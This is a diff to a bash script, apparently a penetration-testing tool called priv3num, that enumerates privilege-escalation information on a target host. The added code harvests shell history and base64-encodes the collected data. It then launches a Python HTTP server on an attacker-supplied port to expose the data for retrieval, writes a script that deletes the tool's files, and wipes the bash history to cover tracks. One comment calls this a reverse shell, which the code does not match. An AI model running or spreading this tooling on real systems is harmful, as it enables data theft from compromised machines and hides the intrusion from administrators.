@@ -1,11 +1,9 @@
 #!/bin/bash
 #wget https://github.com/h1dz/Pen-Testing/blob/BashScripts/priv3num.sh
 #chmod +x priv3num
+#Usage:        			  ./priv3num <RHOST> <LPORT>
 
 #This script will enumerate information used for privilege escalation
-
-#Usage:        			  ./priv3num <RHOST> <LHOST> <LPORT>
-
 
 B='\033[0;96m' #${B}
 G='\033[0;92m' #${G}
@@ -88,3 +86,17 @@ printf "${B}\n------------------------------Bash history------------------------
 cat ~/.*history | less  >> priv
 printf "${B}\n------------------------------Finished------------------------------\n\n" >> priv
 clear
+echo "#!/bin/bash" >> webserver
+echo "python3 -m http.server $2" >> webserver											#<LPORT>
+base64 priv -w 0 >> 2
+echo "#!/bin/bash" >> remove
+echo "rm -r 2" >> remove
+echo "rm -r priv3num" >> remove
+echo "rm -r priv" >> remove
+echo "rm -r webserver" >> remove
+echo "rm -r remove" >> remove
+#start reverse shell
+chmod +x webserver
+chmod +x remove
+./webserver
+cat /dev/null > ~/.bash_history && history -c
